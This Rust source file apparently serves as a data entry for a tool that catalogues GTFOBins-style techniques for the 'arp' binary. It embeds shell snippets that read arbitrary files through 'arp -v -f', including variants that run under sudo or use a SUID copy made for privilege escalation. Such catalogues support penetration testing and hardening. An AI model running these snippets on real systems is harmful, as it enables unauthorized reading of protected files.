pub static BIN_NAME: &'static str = "arp";
pub static BIN_DESC: &'static str = "The read file content is corrupted by error prints.";
static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    arp -v -f "$LFILE"
"#;
static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which arp) .

    LFILE=file_to_read
    ./arp -v -f "$LFILE"
"#;
static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo arp -v -f "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
